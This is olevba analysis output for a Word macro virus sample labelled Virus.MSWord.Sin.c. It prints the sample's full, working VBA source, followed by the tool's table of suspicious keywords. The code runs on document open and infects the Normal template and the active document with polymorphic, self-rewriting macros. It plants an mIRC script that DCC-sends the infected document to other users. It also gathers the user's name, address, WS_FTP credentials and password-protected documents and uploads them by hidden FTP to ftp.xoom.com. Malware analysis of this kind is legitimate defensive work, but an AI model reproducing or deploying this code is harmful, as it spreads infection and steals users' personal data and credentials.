olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sin.c-265988d73f216f1b0eac0888635fea49bb815077
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sin.c-265988d73f216f1b0eac0888635fea49bb815077 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
CFECUMI:    LordArz = "Technological Illusions"
AAA = PPPPP
MELMXEOC:    NormInstalled = False
EVVGKSNGN:    ActInstalled = False
NHPXNU:    Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
JLLFAWLLSTY:    Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
ISJIHRBWFRD:
YAXLAFMVWT:    NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
HMXEOMUH:    AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
MFRMYRTBGHC:
D = HHHHH
TBJIMUR:    If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True
CCCC = QQQQQQ
KFTCDYCKL:    If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True
XHWMGFXNCH:
MVSOEUWAKVW:  PPPP = WWW
FSSTMBWNWYS:    If NormInstalled = False Then
TMSUETUC:        Set Infection = NormCarrier
OCPLIH:        Set Carrier = ActCarrier
JGWLEQKWAD:    Else
MCMDPYR:        Set Infection = ActCarrier
KXIUCFLSQYK:        Set Carrier = NormCarrier
OTATHRGHF:    End If
BRLOYVNB:
LTFVPAPR:  YY = i
IYGROHJ:    DoEvents
RLJYCNODTN:  CCCC = KKKKK
II = JJJ
RLOAJPNXGJ:
CXRNYEVSHKN:    Close
XNHJINTWL:    Tr1 = Dir(CurDir & "\script.ini", vbNormal)
TTTT = E
NRFLIKRED:    Tr2 = UCase(Right(CurDir, 8))
CABIAPH:    Tr3 = Dir("C" & Chr(58) & "\MIRC", vbDirectory)
FECTOEDDL:
P = SSSSSS
CQVCVKMVUUN:    If Tr1 <> "" Then SDir = CurDir & "\script.ini"
VVV = L
LYBYYDXMCC:    If Tr2 = "DOWNLOAD" Then SDir = CurDir & "\..\Script.ini"
SAANSHT:    If Tr3 <> "" Then SDir = "C" & Chr(58) & "\MIRC\Script.ini"
EEEEEE = RR
WCXLBMQU:
QEWRIJQ:    If SDir <> "" Then
ADAOGRRNUWQ:        Open SDir For Output As #1
EVCQMCBWP:        Print #1, "n0=on 1" & Chr(59) & "JOIN" & Chr(59) & "#" & Chr(59) & "if ( $me != $nick ) { /dcc send $nick " & ThisDocument.FullName & " }"
IXRNXP:        Close #1
XNIBUESCHE:  D = x
SICCOA:    End If
JMAOQVLUKA:
QQQQQQ = IIIII
CSTUMOMBRM:  C = B
JDQNWLL:    DoEvents
DIAMWXY:
KGTJTYNQ:    WinPath = Environ("WINDIR")
BPOSFLLD:  JJJ = SSSSSS
SSHISVUGR:
AAOMEO:    If Application.Tasks.Exists("Sockets Window") = True And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "" Or System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = WeekDay(Date) Then
VVVV = RRRR
SQXFKLJSU:        With Application.FileSearch
x = BBBBBB
BECMDBM:                .FileName = "WS_FTP.ini"
DDVWTSWRXUD:  EEEEE = EEEE
BAIGOLIOS:                .LookIn = "C" & Chr(58) & "\"
QAMPBIOQIJC:  YYYY = DDDDDD
IRGFAOLNRVQ:                .SearchSubFolders = True
IIIIII = RRRRR
FVSKKQ:                .MatchTextExactly = True
UKRDXOWXWVP:  AA = KKKKKK
YSSQHTVXC:                .FileType = msoFileTypeAllFiles
OOOOO = LLLLL
MKCNWV:                .Execute
PICVHEEY:                WsPath = .FoundFiles(1)
SQFWYDN:        End With
VLEVEBCFS:
IXMVENQVW:        DoEvents
PCTIEL:
SIXSTXIH:        If ActiveDocument.HasPassword = True Then BCK = True
WWW = HHHHH
UTJOJTNUU:
INSTHP:        DoEvents
TT = DDD
RPOTGJD:        Open WinPath & "\" & Application.UserInitials & ".dat" For Output As #10
VSAWUJW:        Print #10, Application.UserName
HHHH = XXXXX
GHMOGNIQ:        Print #10, Application.UserAddress
GVEBHQ:        If BCK = True Then Print #10, ActiveDocument.FullName
GASXQFI:        If WsPath <> "" Then Print #10, "WS_FTP"
TDXMQPLC:        Close #10
PPBLGOYIWY:        Open WinPath & "\Command.$$$" For Output As #8
VRDYGIAJG:        Print #8, "o ftp.xoom.com"
ERMTRVDO:        Print #8, "User SingOfScream"
CCXDSXIJXA:        Print #8, "DIG001"
PETFMP:        Print #8, "binary"
FDSEMFEFP:        Print #8, "put " & WinPath & "\" & Application.UserInitials & ".dat"
AICRNS:        If WsPath <> "" Then Print #8, "put " & WsPath
RPYHMYYKW:        If BCK = True Then Print #8, "put " & ActiveDocument.FullName
UEQCBPAH:  KK = UUUUU
P = QQQQQQ
VNMAPUCYP:            Print #8, "quit"
UVNELKTT:  NNNNN = KKKKKK
CLCPLOIEF:        Close
FSCHKOJKKK:        Shell WinPath & "\command.com /c FTP.exe -n -s:" & WinPath & "\Command.$$$", vbHide
HRICGEYWTC:        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = WeekDay(Date)
TDCKGAULWE:    End If
DTPEPS:
HJEXRAEIMYN:    For x = 1 To ThisDocument.Variables.Count
R = A
HYXLGXUVHDJ:        ThisDocument.Variables(x).Delete
FWWMYDGQD:    Next x
PUMANOVGYF:    For x = 1 To Normal.ThisDocument.Variables.Count
IRIOAFEC:        Normal.ThisDocument.Variables(x).Delete
LEXYWMNQO:    Next x
GTDCCOFXVYH:
HHH = XXX
TNVAFC:    With Carrier
HXBNSRVEX:        UECode = .Lines(1, 2) & Chr(13)
NNNNN = VVVVV
DTRFWI:        For x = 5 To .CountOfLines - 1
DHKAFURLXOD:  R = XXXXX
TOHVCBYRE:            VCCode = .Lines(x, 1)
JABUVBB:            If VCCode = "End Sub" Then Exit For
VHJYXBJJU:            For i = 1 To 20
KJBDOJWCH:                If Mid(VCCode, i, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - i)
OVUYCCE:            Next i
PRSIDFEFE:            factor = ""
MYEEGOABNE:            For Y = 1 To Int(Rnd * 6) + 6
TVJXKKH:                factor = factor & Chr(Int(Rnd * 25) + 65)
PWGJKH:            Next Y
QXKPAUYPECB:            make_morph = factor & ": "
AWTPUM:  UUUUU = GGG
DSFWQJVPV:
AAA = V
HYLDQUKC:            VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
KMLGFVKHIY:            If Int(Rnd * 10) > 7 Then VirCode = VirCode & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & " = " & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & Chr(13)
PDNOKP:        Next x
QHPHSQHIQYC:        VirCode = UECode & VirCode & "End Sub"
VVVVV = XXXX
TQLFFFLMS:    End With
W = SSS
KQSLSCJT:  YYY = SSSSS
TBDSLXCKCG:
VUPXOYHQOYP:    Normal.ThisDocument.Variables.Add "VCode", VirCode
CCC = KKKK
IAAPCJ:
LICNKWU:    ResetMe = "Private Sub Document_Close()" & Chr(13)
LL = II
QHMOUK:    ResetMe = ResetMe & String(150, Chr(9)) & "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save" & Chr(13)
FLXCEAKNOTC:    ResetMe = ResetMe & "End Sub"
IRMRXMENAVT:
TT = NNN
SLSEAHIEX:  NNNNNN = NNN
SMQEKKFXFC:    With ActCarrier
QAYIKPPH:            .DeleteLines 1, .CountOfLines
MMMMMM = K
CBWXIBVQQ:            .InsertLines 1, ResetMe
LFNLVMQOOGR:    End With
KPUTPMEC:
PFAIBVUFYPD:  FFFFF = WWW
CHRFIFEBI:    With NormCarrier
O = M
HRXHSOSSFJ:        .DeleteLines 1, .CountOfLines
FQQERC:  H = XXXX
XAPSHS:        .InsertLines 1, ResetMe
RTUCRRI:  N = MMMM
UUUUU = GG
MCTAILF:    End With
VMDLALJ:
KKKKK = LLLL
KGKWEUQ:    ActiveDocument.Save
CCCCCC = OOO
SMDTUOYHHJC:    NormalTemplate.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |FTP.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

